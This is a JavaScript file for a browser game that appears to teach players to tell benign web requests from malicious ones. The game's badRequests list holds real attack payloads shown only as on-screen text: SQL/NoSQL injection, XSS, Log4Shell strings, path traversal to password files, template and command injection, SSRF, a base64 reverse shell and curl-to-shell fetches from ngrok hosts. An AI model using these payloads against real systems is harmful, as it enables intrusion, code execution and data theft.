document.addEventListener('DOMContentLoaded', () => {

    const gameContainer = document.getElementById('game-container');
    const gameArea = document.getElementById('game-area');
    const piggyElement = document.getElementById('piggy');
    const scoreDisplay = document.getElementById('score-display');
    const livesDisplay = document.getElementById('lives-display');
    const gameOverScreen = document.getElementById('game-over');
    const winScreenElement = document.getElementById('win-screen');
    const startScreenElement = document.getElementById('start-screen');
    const startButtonElement = document.getElementById('start-button');
    // **** 1. PRELOAD AUDIO ****
    const shieldUpSound = new Audio('snout.mp3'); 
    // Error handling during loading
    shieldUpSound.onerror = () => {
        console.error("Failed to load the shield sound:", shieldUpSound.src);
    };

    const goodRequests = [
        "GET /account/login?next=/confidential/78621",
        "GET /static/new/vendor/jquery/jquery-3.3.1.min.js",
        "GET /videos/?special_id=33",
        "GET /robots.txt",
        "GET /search/?q=laptop&sort=price_asc",
        "GET /api/v1/items/?category=books&limit=10&page=2",
        "GET /auth/?token=abc123&expires=3600",
        "GET /files/?name=report.pdf&type=pdf&download=true",
        "GET /weather/?city=London&unit=metric",
        "GET /posts/?author=john&tag=tech&limit=5&offset=10",
        "GET /stats/?from=2023-01-01&to=2023-12-31&type=summary&format=json",
        "GET /events/?date=2025-04-06&location=NYC&category=conference&page=1&per_page=20",
        "GET /media/post_images/JPXUGWXCMG.JPEG",
        "GET /profile/?username=jane_doe",
        "GET /cart/?item_id=12345&quantity=2",
        "GET /news/?topic=world&sort=latest",
        "GET /api/data/?filter=active&include=details",
        "GET /lookup/?term=New%20York&exact=true",
        "GET /docs/?file=guide.pdf&lang=en",
        "GET /movies/?genre=comedy&year=2023&rating=PG-13",
        "GET /track/?id=abc123&format=json&verbose=1",
        "GET /comments/?post_id=789&limit=10",
        "GET /convert/?amount=100&from=USD&to=EUR",
        "GET /images/?query=mountain%20view&size=large",
        "GET /products/?q=wireless%20earbuds&in_stock=true",
        "GET /session/?user_id=999&active=true",
        "GET /downloads/?file_id=45&token=s3cr3t",
        "GET /recipes/?ingredient=chicken%20breast&max_time=30",
        "GET /status/?service=api&uptime=true",
        "GET /messages/?sender=alice&unread=true&since=2024-01-01",
        "GET /store/?location=San%20Francisco&open_now=true",
        "GET /videos/?category=education&sort=popular&lang=en",
        "GET /support/?issue=login%20failed&priority=high&retries=3",
        "POST {\"id\": 827, \"database\": \"sex\", \"aggregate_by\": \"langs\"}",
        "POST {\"id\": 4320, \"database\": \"sitepanel\", \"aggregate_by\": \"uploadfolder\"}",
        "POST {\"id\": 3340, \"database\": \"juken\", \"aggregate_by\": \"supervise\"}",
        "POST {\"id\": 82982, \"database\": \"phplink\", \"aggregate_by\": \"vg1\"}",
        "POST {\"id\": 8880, \"database\": \"email_archives\", \"aggregate_by\": \"denialaxara\"}",
        "POST {\"id\": 530, \"database\": \"fornells\", \"SELECT\": \"jerauld\"}",
        "POST {\"username\": \"john_doe\", \"password\": \"s3cret\"}",
        "POST {\"email\": \"user@example.com\", \"union\": true}",
        "POST {\"product_id\": 123, \"quantity\": 2, \"coupon\": \"WELCOME10\"}",
        "POST {\"title\": \"New Blog Post\", \"content\": \"This is the content.\", \"tags\": [\"tech\", \"news\"]}",
        "POST {\"latitude\": 40.7128, \"longitude\": -74.0060}",
        "POST {\"search\": \"wireless earbuds\", \"filters\": {\"brand\": \"Sony\", \"price_max\": 150}}",
        "POST {\"event\": \"user_login\", \"timestamp\": \"2025-04-06T12:00:00Z\"}",
        "POST {\"from\": \"USD\", \"to\": \"EUR\", \"amount\": 100}",
        "POST {\"user_id\": 42, \"settings\": {\"theme\": \"dark\", \"notifications\": false}}",
        "POST {\"question\": \"What is the capital of France?\", \"options\": [\"Paris\", \"Berlin\", \"Rome\"]}",
        "POST {\"movie_id\": \"tt0111161\", \"rating\": 5, \"review\": \"All-time favorite.\"}",
        "POST {\"file_name\": \"invoice_2025.pdf\", \"overwrite\": true}",
        "POST {\"comment\": \"Nice article!\", \"post_id\": 789, \"reply_to\": null}",
        "POST {\"device_id\": \"abc123\", \"status\": \"offline\"}",
        "POST {\"payment\": {\"card_number\": \"1221 8774 3334 4242\", \"amount\": 499.99}}",
        "POST {\"recipe\": {\"title\": \"Pasta\", \"ingredients\": [\"noodles\", \"sauce\"], \"servings\": 2}}",
        "POST {\"form_data\": {\"name\": \"Alice\", \"age\": 30, \"gender\": \"female\"}}",
        "POST {\"path\": \"/home/user/docs/\", \"action\": \"delete\"}",
        "POST {\"task\": \"backup\", \"schedule\": {\"daily\": true, \"time\": \"02:00\"}}",
        "POST {\"message\": \"Hey there!\", \"to\": [\"user123\", \"user456\"], \"urgent\": false}",
        "GET /cgi-bin/restore_password.pl",
        "GET /cgi-bin/www.pl",
        "GET /cgi-bin/bigconf.cgi",
        "GET /cgi-bin/webmap.cgi",
        "GET /cgi-bin/wwwwais",
        "GET /cgi-bin/stats/stats.cgi",
        "GET /cgi-bin/info/setup.cgi",
        "GET /cgi-bin/mt-static/mt-load.cgi",
        "GET /xmlrpc.php",
        "GET /wp-includes/block-patterns/about.php",
        "GET /themes/js/fancy/fancybox_sprite@2x.png",
        "GET /wp-json/oembed/1.0/embed?url=http%3A%2F%2Floveme.com%2F&",
        "GET /wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.51.0-2014.06.20",
        "GET /wp-json/acf/v3/options/a?id=wp_mail&field=smtp",
        "GET /wp-login.php?redirect_to=http%3A%2F%2Fmisterytowers.com%2Fwp-admin%2F&reauth=1"
    ];
    const badRequests = [
        "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php",
        "GET /index%2Ephp%3Flang%3D%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Ftmp%2Findex1",
        "POST {'campaign_id': 1, 'email': '\";SELECT SLEEP(5)#', 'message': 'hey'}",
        "POST {'campaign_id': 1, 'email': '\" ORDER BY 2-- -', 'message': 'foliot'}",
        "POST {'id': 11, 'email': '>= 5.0', 'message': 'Clicked'}",
        "POST {'id': 1788, 'user': \"') AND 5961=8115 AND ('BWSz'='BWSz\", 'token': ''}",
        "POST {'index': 16, 'list': '(SELECT CONCAT(CONCAT(0x7178717a71,(CASE WHEN (7649=7649) THEN 0x31 ELSE 0x30 END)),0x716a6a7671))', 'message': 'Link'}",
        "GET /index.php?dir=/..\../..\../..\../..\../..\../..\../boot.ini",
        "GET /index.php?dir=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini",
        "GET /index.php?dir=/./././././././././././etc/shadow",
        "GET /index.php?dir=home/..2f..2f..2f..2f..2fetc2fpasswd%00",
        "GET /index.php?class_log=${jndi:rmi://gettingthingsdone.com}",
        "GET /index.php?log=${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://flymetothemoon.com}",
        "GET /status/?service=api'&uptime=true",
        "GET /messages/?sender=alice)%20or%20('x'='x&unread=true&since=2024-01-01",
        "GET /store/?location=San%20Francisco'&open_now=true",
        "GET /videos/?category=education&sort=1'%20and%20char(124)%2Buser%2Bchar(124)=0%20and%20'%25'='&lang=en",
        "GET /support/?issue=login%20failed&priority=high%27%3B+IF+%281%3D1%29+WAITFOR+DELAY+%2700%3A00%3A01%27--&retries=3",
        "POST {\"id\": 827, \"database\": \"sex'%20OR%201=1---\", \"aggregate_by\": \"langs\"}",
        "POST {\"id\": 4320, \"database\": \"FOO+%2B+%28SELECT+9350+WHERE+8850%3D8850+AND+3963%3D4777--++%29\", \"aggregate_by\": \"uploadfolder\"}",
        "POST {\"id\": 33340, \"database\": \"juke'%20OR%201=1---\", \"aggregate_by\": \"supervise\"}",
        "POST {\"id\": 882, \"database\": \"-.1a%20union%20%28select+id+from+users+limit+1%2C1%29\", \"aggregate_by\": \"vg1\"}",
        "POST {\"id\": 80, \"database\": \"email_archives\", \"aggregate_by\": \"materials'%20and%201=1%20and%20''='\"}",
        "POST username[$ne]=toto&password[$ne]=toto",
        "POST login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto",
        "POST {\"username\": {\"$gt\": undefined}, \"password\": {\"$gt\": undefined}}",
        "POST {\"username\": {\"$gt\":\"\"}, \"password\": {\"$gt\":\"\"}}",
        "POST username[$ne]=toto&password[$regex]=.{3}",
        "POST {\"username\":{\"$in\":[\"Admin\", \"4dm1n\", \"admin\", \"root\", \"administrator\"]},\"password\":{\"$gt\":\"\"}}",
        "GET /cart/?item_id=12345&q=</script><svg><script>alert(1)-%26apos%3B",
        "GET /news/?topic=worldanythinglr00</script><script>alert(document.domain)</script>uxldz&sort=latest",
        "GET /api/data/?filter=active&include=1'\"><img/src/onerror=.1|alert``>",
        "GET /api/v2/?filter=active&include=<svg/onload=%26nbsp;alert`bohdan`+",
        "GET /lookup/?id=1'; use master; exec xp_dirtree '\\fleet_4533456.com\share';-- term=New%20York&exact=true",
        "POST ProductID=1);waitfor delay '0:0:10'--",
        "GET /files/?name=<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>&type=pdf&download=true",
        "GET /weather/?city=<name>','')); phpinfo(); exit;/*</name>&unit=metric",
        "GET /posts/?author=<![CDATA[<script>var n=0;while(true){n++;}</script>]]>&tag=tech&limit=5&offset=10",
        "GET /stats/?from=2023-01-01&to=2023-12-31&type=<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]>&format=xml",
        "GET /events/?date=2025-04-06&location=NYC&category=<w=\"/x=\"y>\"/OndbLcLick=`<`[confir\u006d``]>z&page=1&per_page=20",
        "GET /api/?data=%7B%22$ne%22:null%7D",
        "GET /details/?id=1%27%20AND%20sleep(5)--+",
        "POST file=Invitation.pdf%0a ping -i 30 127.0.0.1 %0a",
        "POST path=clear%0a id %0a",
        "POST {\"from\": \"USD\", \"to\": \"EUR\", \"action\": \"|/usr/bin/id|\"}",
        "POST {\"action\": \";system('/usr/bin/id')\", \"instance\": 1 }",
        "POST location=&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;",
        "POST {\"id\": 4721, \"database\": \"maq\", \"field\": \"{{4*8}}\"}",
        "POST {\"id\": 22, \"post\": \"[[${2*12}]]\"}",
        "POST post={{ namespace.__init__.__globals__.os.popen('id').read() }}",
        "POST w={{ self.__init__.__globals__.__builtins__ }}",
        "POST location={{include(\"wp-config.php\")}}",
        "POST list=<%=%20`ls /`%20%>&l=\"main\"",
        "POST location=gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php",
        "POST system_id=2&location=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php",
        "GET /stats.php?url=ldap://localhost:11211/%0astats%0aquit",
        "GET /send.php?url=gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A",
        "GET /cms/news.html?newsitemid=../pricing/default.js?cb=alert(document.domain)//",
        "GET /channels/channelname?telem_action=under_control&forceRHSOpen&telem_run_id=../../../../../../api/v4/caches/invalidate",
        "GET /index.php?page=php://filter/read=string.rot13/resource=index.php",
        "GET /index.php?page=php://filter/convert.base64-encode/resource=index.php",
        "GET /index.php?page=/var/log/apache/access.log",
        "GET /image.jpg&quot;|/bin/nc.traditional 127.0.0.1 4242 -e /bin/bash&quot;",
        "GET /item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --",
        "GET /tftgallery/settings.php?sample='></link><script>alert('blake",
        "GET /cgi-bin/webbbs/webbbs_config.pl?name=joe&email=test@example.com&body=aaaaffff&followup=10;cat%20/etc/passwd",
        "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "GET /cgi-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|",
        "GET /cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah",
        "GET /cgi-bin/commerce.cgi?page=../../../../../../../../../../etc/passwd%00index.html",
        "GET /cgi-bin/fom.cgi?file=<script>alert('1')</script>",
        "GET /cgi-bin/bslist.cgi?email=x;ls",
        "GET /whois?url=echo%20YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Mi80NDMgMD4mMQo=|base64%20-d|bash",
        "GET /who?url=curl%20https://f6e0-160-154-163-253.ngrok-free.app/a|sh",
        "GET /file.php?url=https://1a2b-3c4d-5e6f-7g8h-9i0j.ngrok.app/x|fish"
    ];

    let gameWidth;
    let gameHeight;
    const piggyWidth = 50;
    const piggyHeight = 70;
    const numLanes = 7;
    let laneHeight;
    let piggySpeed;
    let stringBaseSpeed;
    const stringFastSpeedFactor = 15;
    const stringSpawnInterval = 1100;
    const maxStrings = 5;

    let score = 0;
    let lives = 3;
    let piggyLane = 0;
    let isShielding = false;
    let isGameOver = false;
    let isGameWon = false;
    let strings = [];
    let spawnTimer = null;
    let lastFrameTime = 0;
    let animationFrameId = null;

    if (startButtonElement && startScreenElement) {
        startButtonElement.addEventListener('click', () => {
            console.log("Start button clicked!");
            // Hide the start screen
            startScreenElement.style.display = 'none';
            // Initialize and start the game
            init(); // <--- GAME STARTS HERE NOW
        });
    } else {
        console.error("Start screen elements not found!");
        // Fallback: Start the game immediately if start screen is missing?
        // init();
    }
    // --- Helper Functions (Ensure they are correct) ---
    function updatepiggyPosition() { /* same as before */
        if (!gameHeight || !laneHeight) return;
        const laneCenterY = (piggyLane + 0.5) * laneHeight;
        const targetBottom = laneCenterY - (piggyHeight / 2);
        const maxBottom = gameHeight - piggyHeight - 5;
        const minBottom = 5;
        piggyElement.style.bottom = `${Math.max(minBottom, Math.min(maxBottom, targetBottom))}px`;
    }
    function updateScore() {
        scoreDisplay.textContent = score;
        // Check for win condition *here*
        if (score >= 100 && !isGameOver && !isGameWon) { // Added !isGameWon check
            winGame();
        }
    }
    function updateLives() { /* same as before */
        let hearts = '';
        for (let i = 0; i < 3; i++) {
            hearts += i < lives ? '❤️' : '<span class="lost">❤️</span>';
        }
        livesDisplay.innerHTML = hearts;
        if (lives <= 0 && !isGameOver) { endGame(); }
    }
    function getRandomLane() { return Math.floor(Math.random() * numLanes); }
    function getRandomSentence(type) { /* same as before */
        const list = type === 'good' ? goodRequests : badRequests;
        return list[Math.floor(Math.random() * list.length)];
    }
    function flashElement(element, className, duration = 300) {
        if (!element) return;
       element.classList.add(className);
       setTimeout(() => {
           // Check if element still exists before removing class
           if (element && element.classList.contains(className)) {
                element.classList.remove(className);
           }
       }, duration);
    }
    function removeString(stringData) {
        if (!stringData) return;
        if (stringData.element && stringData.element.parentNode === gameArea) {
            gameArea.removeChild(stringData.element);
            stringData.element = null;
        }
        const index = strings.findIndex(s => s === stringData);
        if (index !== -1) {
            strings.splice(index, 1);
        }
    }
    function spawnString() {
        // Initial checks: Game over or max strings already on screen
        if (isGameOver || strings.length >= maxStrings || !stringBaseSpeed) {
            return;
        }

        // --- Find Currently Occupied Lanes ---
        const occupiedLanes = new Set();
        for (const existingString of strings) {
            occupiedLanes.add(existingString.lane);
        }

        // --- Determine Available Lanes ---
        const availableLanes = [];
        for (let i = 0; i < numLanes; i++) {
            // If a lane 'i' is NOT in the occupied set, it's available
            if (!occupiedLanes.has(i)) {
                availableLanes.push(i);
            }
        }

        // --- Check if any lane is actually available ---
        if (availableLanes.length === 0) {
            // console.log("Spawn attempt failed: No available lanes.");
            return; // Cannot spawn if all lanes are currently full
        }

        // --- Choose a random lane FROM THE AVAILABLE ONES ---
        const targetLane = availableLanes[Math.floor(Math.random() * availableLanes.length)];

        // --- Proceed with creating the string for the chosen available lane ---
        const type = Math.random() < 0.5 ? 'good' : 'bad';
        const sentence = getRandomSentence(type);

        const stringElement = document.createElement('div');
        stringElement.classList.add('string');
        stringElement.textContent = sentence;

        // Calculate vertical position based on the chosen targetLane
        const stringHeight = 20; // Estimate or measure dynamically if needed
        const stringY = targetLane * laneHeight + (laneHeight - stringHeight) / 2;
        stringElement.style.bottom = `${stringY}px`;

        // Append to DOM temporarily to measure width
        stringElement.style.visibility = 'hidden';
        stringElement.style.left = '-9999px';
        gameArea.appendChild(stringElement);
        const textWidth = stringElement.offsetWidth;

        // Set final starting position and make visible
        stringElement.style.left = `-${textWidth}px`;
        stringElement.style.visibility = 'visible';

        // Add to the active strings array
        strings.push({
            element: stringElement,
            lane: targetLane, // Assign the chosen available lane
            type: type,
            speed: stringBaseSpeed,
            hit: false,
            textWidth: textWidth
        });
     }

    function endGame() {
        if (isGameOver) return;
        isGameOver = true;
        cancelAnimationFrame(animationFrameId);
        animationFrameId = null;
        clearInterval(spawnTimer);
        spawnTimer = null;

        // **** ADDED: Add class to reposition piggy ****
        piggyElement.classList.add('game-over-position');
        piggyElement.classList.remove('shielding');

        gameOverScreen.style.display = 'flex'; // Show GAME OVER message
        console.log("Game Over!");
    }
    function winGame() {
        if (isGameOver || isGameWon) return; // Prevent multiple calls
        console.log("Game Over - Won!");
        isGameOver = true; // Mark game as stopped
        isGameWon = true; // Mark as won
        cancelAnimationFrame(animationFrameId); animationFrameId = null;
        clearInterval(spawnTimer); spawnTimer = null;

        // Optional: Center piggy on win screen too? Or hide it?
        piggyElement.classList.add('game-over-position'); // Reuse centering class
        piggyElement.classList.remove('shielding');

        // Show WIN screen
        if (winScreenElement) {
            winScreenElement.style.display = 'flex';
        } else {
            console.error("Win screen element not found!");
        }
        // Optional: Play win sound
        // winSound.play();
    }
    function gameLoop(currentTime) {
        if (isGameOver) return;
        if (!gameWidth || !gameHeight || !stringBaseSpeed || !gameArea) {
             animationFrameId = requestAnimationFrame(gameLoop); return;
        }

        const deltaTime = currentTime - (lastFrameTime || currentTime);
        lastFrameTime = currentTime;
        const dt = Math.min(deltaTime, 100);

        const gameAreaRect = gameArea.getBoundingClientRect();
        const piggyRect = piggyElement.getBoundingClientRect();
        const piggyLeftEdge = piggyRect.left - gameAreaRect.left;
        const piggyRightEdge = piggyLeftEdge + piggyWidth;

        if (isNaN(piggyLeftEdge) || isNaN(piggyRightEdge)) {
             console.error("Failed to calculate piggy position.");
             animationFrameId = requestAnimationFrame(gameLoop); return;
        }

        // --- Iterate through strings ---
        for (let i = strings.length - 1; i >= 0; i--) {
            if (i >= strings.length) continue;
            const str = strings[i];
            if (!str || !str.element || typeof str.speed === 'undefined') {
                removeString(str); continue;
            }

            let currentSpeed;
            if (str.hit) { currentSpeed = str.speed }
            else { currentSpeed = stringBaseSpeed; if(str.speed !== stringBaseSpeed) str.speed = stringBaseSpeed; }

            const currentLeft = parseFloat(str.element.style.left || -str.textWidth);
            const newLeft = currentLeft + currentSpeed * dt;
            str.element.style.left = `${newLeft}px`;
            const stringRightEdge = newLeft + str.textWidth;

            const overlapsHorizontally = stringRightEdge >= piggyLeftEdge && newLeft <= piggyRightEdge;
            const hasPassedpiggy = newLeft >= piggyRightEdge;


            // --- Scenario 1: Successful Block ---
            if (!str.hit && overlapsHorizontally && str.lane === piggyLane && isShielding) {
                 str.hit = true;
                str.speed = - (stringBaseSpeed * stringFastSpeedFactor); // Fly left

                if (str.type === 'bad') {
                    score++; updateScore(); flashElement(str.element, 'flash-block-bad');
                    console.log(`BLOCK SUCCESS (BAD): Score: ${score}, Flying Left`);
                } else { // good
                    lives--; updateLives(); flashElement(str.element, 'flash-block-good');
                    console.log(`BLOCK PENALTY (GOOD): Lives: ${lives}, Flying Left`);
                }
                if (isGameOver) break;
                continue;
            }

            // --- Scenario 2: String Missed ---
            if (!str.hit && hasPassedpiggy) {
                str.hit = true; // Mark as missed
                str.speed = stringBaseSpeed * stringFastSpeedFactor; // Set speed explicitly for rightward accel

                if (str.type === 'bad') {
                    // Missed BAD string: Lose life, flash text red, FLASH BACKGROUND RED
                    lives--;
                    updateLives();
                    flashElement(str.element, 'flash-block-good'); // Flash text red
                    console.log(`MISS PENALTY (BAD): Lives: ${lives}, Speeding Right, Flashing Background`);

                    // **** Flash Background ****
                    gameArea.classList.add('background-flash-red'); // Add flash class

                    // Set timeout to remove the background flash class after 1 second
                    setTimeout(() => {
                        gameArea.classList.remove('background-flash-red');
                    }, 100); // 1000 milliseconds = 1 second


                } else { // type === 'good'
                    console.log(`MISS OK (GOOD), Speeding Right`);
                    // No special effect needed for missed good strings
                }
                if (isGameOver) break;
                // String accelerates right on subsequent frames
            }

            // --- Scenario 3: Remove Off-Screen Strings ---
             if (newLeft > gameWidth + 50) { // Off-screen right
                removeString(str);
            } else if (stringRightEdge < -50) { // Off-screen left (after block)
                removeString(str);
            }


        } // --- End of string loop ---

        // Request next frame if game not over
        if (!isGameOver) {
            animationFrameId = requestAnimationFrame(gameLoop);
        }
    }


    // --- Event Listeners --- 
     function handleKeyDown(e) { 
        if (isGameOver) return;
        if (e.code === 'ArrowUp' && !isShielding) {
             if (piggyLane < numLanes - 1) {
                piggyLane++;
                updatepiggyPosition();
            }
        } else if (e.code === 'ArrowDown' && !isShielding) {
             if (piggyLane > 0) {
                piggyLane--;
                updatepiggyPosition();
            }
        } else if (e.code === 'Space') {
            if (!isShielding) {
                 isShielding = true;
                 piggyElement.classList.add('shielding');
                 // **** 2. PLAY SOUND ****
                 try {
                    // Reset sound to beginning in case of rapid press/release
                    shieldUpSound.currentTime = 0;
                    // Play the sound
                    shieldUpSound.play().catch(error => {
                        // Play() returns a promise which can reject if playback fails
                        // (e.g., browser restrictions before user interaction)
                        console.warn("Shield sound playback failed:", error);
                    });
                 } catch (err) {
                     console.error("Error playing shield sound:", err);
                 }
                 // **** END PLAY SOUND ****
            }
            e.preventDefault();
        }
     }
     function handleKeyUp(e) { /* ... */
         if (e.code === 'Space') {
            isShielding = false;
            piggyElement.classList.remove('shielding');
        }
      }
    document.addEventListener('keydown', handleKeyDown);
    document.addEventListener('keyup', handleKeyUp);


    // --- Initialization ---
    function init() { 
        console.log("Attempting Initialization...");
        // Make sure game-over screen is hidden
        gameOverScreen.style.display = 'none';
        // Make sure start screen is hidden (in case of restart)
        if (startScreenElement) startScreenElement.style.display = 'none';
        if (winScreenElement) winScreenElement.style.display = 'none'; // Hide win screen
        
        
         if (!gameArea || !piggyElement || !scoreDisplay || !livesDisplay || !gameOverScreen) {
            console.error("Initialization failed: One or more critical DOM elements not found.");
            return;
        }

         isGameOver = false;
         isGameWon = false;
         score = 0;
         lives = 3;
         isShielding = false;
         piggyElement.classList.remove('game-over-position');

         if (animationFrameId) cancelAnimationFrame(animationFrameId);
         if (spawnTimer) clearInterval(spawnTimer);
         animationFrameId = null;
         spawnTimer = null;

         gameArea.querySelectorAll('.string').forEach(el => el.remove());
         strings = [];

         gameContainer.style.display = 'flex';
         gameArea.style.display = 'block';

         gameWidth = gameArea.offsetWidth;
         gameHeight = gameArea.offsetHeight;

         if (!gameWidth || !gameHeight || gameWidth <= 0 || gameHeight <= 0) {
              console.error(`Initialization failed: Invalid game dimensions (${gameWidth}x${gameHeight}). Retrying...`);
              setTimeout(init, 100);
              return;
         }


         if (numLanes > 0) {
              laneHeight = gameHeight / numLanes;
              piggySpeed = laneHeight;
         } else {
              laneHeight = gameHeight;
              piggySpeed = 10;
         }
         stringBaseSpeed = (gameWidth > 0) ? (gameWidth / 10000) : 0.1;

         console.log(`Game Area Initialized: ${gameWidth}x${gameHeight}, Lanes: ${numLanes}, Lane H: ${laneHeight.toFixed(2)}, Base Speed: ${stringBaseSpeed.toFixed(3)}`);

         piggyLane = Math.floor(numLanes / 2);
         piggyElement.classList.remove('shielding');
         piggyElement.style.right = '20px';

         updatepiggyPosition();
         updateScore();
         updateLives();
         gameOverScreen.style.display = 'none';

         lastFrameTime = performance.now();

         if (stringBaseSpeed > 0) {
            spawnTimer = setInterval(spawnString, stringSpawnInterval);
        }

         animationFrameId = requestAnimationFrame(gameLoop);
          console.log("Initialization complete. Game loop requested.");
     }

    // --- Start & Resize ---
     let resizeTimeout;
     window.addEventListener('resize', () => {
         clearTimeout(resizeTimeout);
         resizeTimeout = setTimeout(() => {
             // Only re-init if game was actually started and is not over
             const gameHasStarted = !startScreenElement || startScreenElement.style.display === 'none';
             if (gameHasStarted && !isGameOver && animationFrameId) {
                 console.log("Window resized during gameplay, re-initializing...");
                 init(); // Re-initialize to adjust dimensions/speeds
             } else {
                 console.log("Window resized, but game not running or already over.");
             }
         }, 250);
      });
      if (startButtonElement && startScreenElement) {
        startButtonElement.addEventListener('click', () => { /* ... hide start, call init ... */ });
    } else { console.error("Start screen elements not found!"); }


    // **** Win Screen Restart Listener ****
    if (winScreenElement) {
        winScreenElement.addEventListener('click', () => {
            console.log("Restarting game from Win Screen...");
            init(); // Call init to restart
        });
    }
      // Game Over restart listener
    gameOverScreen.addEventListener('click', () => {
        console.log("Restarting game from Game Over...");
        init(); // Re-initialize the game on click
    });

}); // End DOMContentLoaded